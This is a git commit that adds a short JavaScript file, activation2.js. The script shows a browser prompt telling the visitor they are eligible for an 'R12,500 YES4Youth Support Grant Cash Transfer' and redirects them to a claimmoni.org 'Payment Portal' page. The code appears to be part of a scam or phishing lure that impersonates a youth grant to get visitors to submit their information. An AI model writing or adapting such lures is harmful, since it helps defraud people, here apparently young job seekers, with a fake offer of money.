0d2d2372817c0183ea0a7dc128ba3af766de0d08
clmmoni <kkween1.00@gmail.com>
2025-10-15 06:51:36 +0100

    Create activation2.js

---
+++ activation2.js
@@ -0,0 +1,5 @@
+var password = 'Submit Now'
+password=prompt('YES4Youth Portal: Congratulations, you are eligible to receive the R12,500 YES4Youth Support Grant Cash Transfer, Kindly press OK to submit your information and receive R12,500 now','Submit Now');
+if (password != 'Submit Now') {
+location.href='https://claimmoni.org/YES4Youth-R12500-Payment-Portal.html';
+}
